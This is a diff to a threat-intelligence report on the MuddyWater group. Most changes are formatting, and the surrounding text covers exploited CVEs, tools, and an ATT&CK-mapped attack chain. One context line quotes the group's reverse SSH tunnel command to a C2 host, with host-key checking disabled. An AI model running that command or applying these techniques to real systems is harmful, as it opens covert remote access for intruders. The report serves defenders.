@@ -100,9 +100,10 @@ MuddyWater has conducted a long running series of espionage and intelligence col
 _The History of Operation_
 
 ---
+
 ## Common Vulnerabilities and Exposures (CVEs)
 
-MuddyWater has used several known vulnerabilities in enterprise systems, remote access tools, and security products to gain access, escalate privileges, and execute code, including:**
+MuddyWater has used several known vulnerabilities in enterprise systems, remote access tools, and security products to gain access, escalate privileges, and execute code, including:
 
 - **CVE-2026-1731** — BeyondTrust Remote Support / Privileged Remote Access OS Command Injection
 - **CVE-2026-1281** — Ivanti Endpoint Manager Mobile (EPMM) Code Injection
@@ -122,6 +123,7 @@ MuddyWater has used several known vulnerabilities in enterprise systems, remote 
 - **CVE-2020-0688** — Microsoft Exchange Server Remote Code Execution
 - **CVE-2017-7921** — Hikvision IP Camera Authentication Bypass
 - **CVE-2017-0199** — Microsoft Office/Word Remote Code Execution
+
 ---
 ## Tools Used 
 MuddyWater has been associated with the following malware, offensive-security tools, remote-management utilities, and credential-theft tools:
@@ -181,7 +183,7 @@ _Attack Chain Operation_
 
 ### 1. Initial Access
 
-**Techniques:**  `T1566.001 – Spearphishing Attachment`  | `T1133 – External Remote Services`
+**Techniques:** `T1566.001 – Spearphishing Attachment`|`T1133 – External Remote Services`
 
 MuddyWater commonly gains initial access through targeted phishing emails containing malicious Microsoft Office documents. In Operation Olalampo, the documents used tailored themes related to accounting, energy, marine services, flight tickets, and business reports. The malicious documents contain embedded VBA macros designed to initiate the infection chain after execution.
 
@@ -191,7 +193,7 @@ MuddyWater obtained access through an RDP login, demonstrating the group's use o
 
 ### 2. Execution
 
-**Techniques:**  `T1204.002 – User Execution: Malicious File` | `T1059.001 – PowerShell` | `T1059.005 – Visual Basic
+**Techniques:** `T1204.002 – User Execution: Malicious File`|`T1059.001 – PowerShell`|`T1059.005 – Visual Basic`
 
 After the victim opens the malicious Office document and enables macros, VBA code executes and initiates the next stage of the infection. MuddyWater uses PowerShell to execute commands, deploy additional payloads, and perform post-exploitation operations.
 
@@ -199,13 +201,13 @@ During Operation Olalampo, multiple malware components were deployed, including 
 
 ### 3. Defense Evasion
 
-**Techniques:** `T1027 – Obfuscated Files or Information` | `T1140 – Deobfuscate/Decode Files or Information` | `T1497 – Virtualization/Sandbox Evasion` | `T1055 – Process Injection`
+**Techniques:** `T1027 – Obfuscated Files or Information`|`T1140 – Deobfuscate/Decode Files or Information`|`T1497 – Virtualization/Sandbox Evasion`|`T1055 – Process Injection`
 
 MuddyWater uses multiple techniques to evade security tools. Office macros and GhostFetch decode embedded data and AES-encrypted PE payloads before execution. GhostFetch also performs environmental checks, including VM, debugger, hardware, and user activity detection, to identify and evade sandbox analysis.
 
 ### 4. Persistence
 
-**Techniques:** `T1543.003 – Windows Service` | `T1547.001 – Registry Run Keys / Startup Folder` | `T1053.005 – Scheduled Task`
+**Techniques:** `T1543.003 – Windows Service`|`T1547.001 – Registry Run Keys / Startup Folder`|`T1053.005 – Scheduled Task`
 
 MuddyWater establishes persistence through different mechanisms depending on the malware family and campaign. GhostBackDoor can install itself as a Windows service named `MicrosoftVersionUpdater` when sufficient privileges are available. 
 
@@ -213,7 +215,7 @@ Other campaigns have involved registry modifications and scheduled tasks to main
 
 ### 5. Discovery
 
-**Techniques:** ` T1082 – System Information Discovery` | `T1016 – System Network Configuration Discovery` | `T1087 – Account Discovery` | `T1069 – Permission Groups Discovery` | `T1482 – Domain Trust Discovery` | `T1057 – Process Discovery`
+**Techniques:** `T1082 – System Information Discovery`|`T1016 – System Network Configuration Discovery`| `T1087 – Account Discovery`|`T1069 – Permission Groups Discovery`|`T1482 – Domain Trust Discovery`|`T1057 – Process Discovery`
 
 1. Identify the compromised system's operating system, hardware, and hostname.
 
@@ -271,7 +273,7 @@ MuddyWater has used custom credential-stealing capabilities to collect credentia
 
 ### 7. Command and Control (C2)
 
-**Techniques:** `T1071.001 – Web Protocols` | `T1102.002 – Bidirectional Communication` | `T1572 – Protocol Tunneling` | `T1573 – Encrypted Channel`
+**Techniques:** `T1071.001 – Web Protocols`|`T1102.002 – Bidirectional Communication`|`T1572 – Protocol Tunneling`|`T1573 – Encrypted Channel`
 
 MuddyWater uses multiple C2 mechanisms depending on the deployed malware :
 
@@ -285,7 +287,7 @@ MuddyWater uses multiple C2 mechanisms depending on the deployed malware :
 
 ### 8. Lateral Movement
 
-Techniques: `T1021.001 – Remote Services: RDP` | `T1021.004 – Remote Services: SSH`
+Techniques: `T1021.001 – Remote Services: RDP`|`T1021.004 – Remote Services: SSH`
 
 MuddyWater uses remote access services to interact with compromised systems and establish remote connectivity. RDP provides interactive access to Windows hosts, while Windows OpenSSH was observed establishing SSH reverse tunnels to attacker controlled infrastructure.
 
@@ -321,7 +323,7 @@ ssh.exe -p 22 -o StrictHostKeyChecking=no <user>@<C2> -N -R 8585
 
 ### 9. Collection
 
-**Techniques:** `T1005 – Data from Local System` | `T1115 – Clipboard Data`
+**Techniques:** `T1005 – Data from Local System`|`T1115 – Clipboard Data`
 
 - MuddyWater malware provides capabilities for collecting information from compromised systems. GhostBackDoor supports local file operations, while HTTP_VIP includes file handling capabilities.
 
